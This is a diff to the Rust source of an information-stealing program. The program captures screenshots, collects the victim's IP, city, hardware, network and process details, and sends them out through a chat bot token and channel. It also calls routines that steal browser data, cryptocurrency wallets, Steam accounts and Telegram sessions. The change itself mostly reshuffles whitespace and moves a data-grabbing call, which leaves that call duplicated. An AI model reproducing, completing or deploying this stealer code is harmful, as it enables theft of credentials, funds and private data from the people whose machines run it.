@@ -34,10 +34,9 @@ static mut CREDIT_CARDS: i64 = 0;
 async fn main() {
     let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();
 
-    other_grabber::sensitive_data::grab_data();
-
-
-
+    
+    
+    
     let string_path: &str = &format!("{}\\logsxc\\", app_data);
     let mutex_file = format!("{}\\dimp.sts", app_data);
 
@@ -55,7 +54,7 @@ async fn main() {
         .open(mutex_file);
 
     std::fs::create_dir(string_path).unwrap(); // Crash if we dont have permission to create the directory.
-
+    
     let channel = ChannelId::from(CHANNEL_ID);
     let bot = Bot::new(BOT_TOKEN.to_string());
     let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
@@ -91,7 +90,7 @@ async fn main() {
         ),
         Err(error) => format!("Error: {}", error),
     };
-
+    
     let mut i = 1;
     for screen in Screen::all() {
         let image = screen.capture().unwrap();
@@ -112,12 +111,12 @@ async fn main() {
         )
         .call()
         .await;
-
-    if let Err(_err) = _call_result {
+        
+        if let Err(_err) = _call_result {
         std::fs::File::create(format!("{}\\error.txt", string_path))
-            .unwrap()
-            .write_all(_err.to_string().as_bytes())
-            .unwrap();
+        .unwrap()
+        .write_all(_err.to_string().as_bytes())
+        .unwrap();
         std::process::exit(0);
     }
 
@@ -135,19 +134,19 @@ async fn main() {
         my_internet_ip::get().unwrap().to_string()
     ));
     sysinfo.push(city);
-
+    
     let hardware = get_hardware();
     if hardware.is_ok() {
         sysinfo.push(format!("{}", hardware.unwrap()));
     }
-
+    
     std::fs::File::create(format!("{}\\info.txt", string_path))
-        .unwrap()
-        .write_all(sysinfo.join("\n").as_bytes())
-        .unwrap();
-
+    .unwrap()
+    .write_all(sysinfo.join("\n").as_bytes())
+    .unwrap();
+    
     let mut system_info = vec![];
-
+    
     system_info.push("=> networks:".to_string());
     for (interface_name, data) in sys.networks() {
         let output = format!(
@@ -165,7 +164,7 @@ async fn main() {
     system_info.push(format!("total swap  : {} KB", sys.total_swap()));
     system_info.push(format!("used swap   : {} KB", sys.used_swap()));
     system_info.push(format!("NB CPUs: {}", sys.cpus().len()));
-
+    
     system_info.push("=> Processes:".to_string());
     system_info.push("=> PID, Name".to_string());
     for (pid, process) in sys.processes() {
@@ -175,12 +174,13 @@ async fn main() {
         .unwrap()
         .write_all(system_info.join("\n").as_bytes())
         .unwrap();
-
+        
     //TODO Make A Method in each Package.
     chrome_grabber::main::chrome_main();
     wallet_grabber::wallets::grab_cold_wallets();
     wallet_grabber::wallets::steal_browser_wallets();
-
+    
+    other_grabber::sensitive_data::grab_data();
     other_grabber::steam::steal_steam_account();
     other_grabber::telegram::steal_telegram();
     other_grabber::sensitive_data::grab_data();
